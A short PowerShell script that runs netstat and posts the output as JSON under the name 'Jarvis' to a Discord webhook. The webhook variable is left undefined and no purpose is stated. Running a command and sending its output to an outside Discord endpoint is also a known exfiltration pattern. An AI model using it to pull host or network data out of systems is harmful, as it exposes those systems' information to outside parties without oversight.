# Set the variables
$command = "netstat"
$message = "Result of the command: $command"

# Execute the command
$output = Invoke-Expression $command

# Convert the output to a string
$content = $output | Out-String

# Create the JSON payload
$payload = @{
    'username' = 'Jarvis'
    'content' = $content
}

# Convert the payload to a JSON string
$payloadString = $payload | ConvertTo-Json

# Send the message to Discord
Invoke-RestMethod -ContentType 'application/json' -Method POST -Uri $webhook -Body $payloadString
